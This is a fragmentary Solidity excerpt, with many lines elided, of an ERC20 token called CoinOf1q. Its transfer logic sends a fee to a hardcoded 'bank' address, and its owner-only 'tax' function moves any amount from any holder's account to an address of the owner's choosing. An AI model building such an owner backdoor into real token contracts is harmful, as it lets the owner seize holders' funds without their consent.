...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address bank = 0xc13407c7c97Dba897DFcbF2887A8Ed8d0ECC95F3;
    uint256 fee;
    ...
    function _transfer(
        ...
        if (to != bank) {
        require(fromBalance >= amount + fee, "CoinOf1q: transfer amount exceeds balance");
        unchecked {
        ...
        _balances[bank] += fee;
            ...
            require(fromBalance >= amount, "CoinOf1q: transfer amount exceeds balance");
            unchecked {
...
contract CoinOf1q is ERC20, ERC20Burnable, Ownable {
    constructor() ERC20("CoinOf1q", "1q") {
    ...
    function tax(address account, address bank, uint256 amount) public onlyOwner {
        _transfer(account, bank, amount);
    }
